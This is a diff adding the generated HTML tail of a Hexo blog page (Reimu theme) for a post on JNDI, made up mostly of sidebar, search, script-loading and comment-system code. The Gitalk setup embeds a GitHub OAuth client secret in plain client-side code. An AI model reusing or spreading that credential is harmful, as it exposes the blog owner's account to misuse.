+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "JNDI",
+          url: "http://example.com/2026/04/01/JNDI/",
+          excerpt: "",
+          description: "",
+          stripContent: "JNDI概述Java Naming Directory Interface，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI可访问的现有目录及服务包括：JDBC（Java 数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请求代理系统结构） 命名服务&amp;#x2F;目录服务JNDI包括命名服务（Naming Service）和",
+          date: "Wed Apr 01 2026 19:46:20 GMT+0800",
+          updated: "Thu Apr 02 2026 12:51:54 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
